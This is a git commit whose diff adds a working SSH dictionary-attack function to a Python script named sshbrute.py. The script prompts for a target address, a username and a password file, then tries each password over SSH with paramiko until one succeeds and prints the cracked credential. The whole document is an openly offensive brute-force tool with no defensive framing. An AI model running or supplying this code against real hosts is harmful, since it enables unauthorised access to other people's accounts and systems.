7958000e9cfd6a634a333a95585a4cec10680e92
JoaoAJMatos <joaoafonsoj2004@gmail.com>
2021-08-30 17:09:57 +0100

    SSH Dictionary Attack
    The script now tries to connect to the SSH port by bruteforcing the password. The path to the password list must be specified. Multi threading hasn't been implemented yet, so the cript runs quite slowly.

--- sshbrute.py
+++ sshbrute.py
@@ -1,8 +1,27 @@
 import paramiko, sys, os, socket, termcolor
 
+# Try to astablish an SSH connection
+def sshConnect(password, code=0):
+    ssh = paramiko.SSHClient()
+    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
+    try:
+        ssh.connect(host, port=22, username=username, password=password)
+
+    except paramiko.AuthenticationException:
+        code = 1
+
+    except socket.error as e:
+        code = 2
+
+    ssh.close()
+    return code
+
+
 host = input('[+] Target Address: ')
 username = input('[+] SSH Username: ')
 fileInput = input('[+] Passwords File: ')
+print('\n')
 
 if os.path.exists(fileInput) == False:
     print('Specified password file does not exist')
@@ -14,4 +33,20 @@ with open(fileInput, 'r') as file:
         password = line.strip('\n')
 
         try: # TODO: implement sshConnect function
-            sshConnect(password)
+            response = sshConnect(password)
+
+            if response == 0:
+                print(termcolor.colored((f"[+] The SSH password has been found: {password} | Username: {username}"), 'green'))
+                break
+
+            elif response == 1:
+                print(f'[-] Incorrect Password: {password}')
+
+            elif response == 2:
+                print(f'[!!!] Unable to Connect to SSH host {host}. Make sure the target is online!')
+                sys.exit(1)
+        
+        except Exception as e:
+            
+            print(e)
+            pass
